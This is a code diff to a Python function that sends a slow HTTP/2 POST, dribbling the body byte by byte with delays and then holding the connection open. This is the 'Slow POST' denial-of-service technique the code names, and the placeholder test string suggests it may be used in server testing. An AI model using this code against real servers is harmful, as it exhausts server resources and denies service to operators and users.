@@ -49,15 +49,14 @@ def send_slow_post(tls_sock, target, path):
         conn.initiate_connection()
         tls_sock.sendall(conn.data_to_send())
         
-        body="acbdefghijklmnopqrstuvwxyz"
-
+        body="test=MY_UNIQUE_TEST_STRING"
+        
         # Prepare the POST headers
         headers = [
             (':method', 'POST'),
             (':authority', target),
             (':scheme', 'https'),
             (':path', path),
-            #('content-length', '10000'),
             ('content-length', str(len(f'{body}'))),
             ('content-type', 'application/x-www-form-urlencoded')
         ]
@@ -71,13 +70,11 @@ def send_slow_post(tls_sock, target, path):
         print(f"POST headers sent. Server is waiting for data...")
 
         for i in range(len(body)):
-            # print(str(len(f'{body}')))
+            time.sleep(2)
 
             # Send part of the body containing the 'test' parameter
             conn.send_data(stream_id, body[i].encode('utf-8'), end_stream=False)  # Partial data, do not end the stream
             tls_sock.sendall(conn.data_to_send())
-
-            time.sleep(10)
 
         # Loop to keep the connection open without sending data (simulating a Slow POST)
         while True:
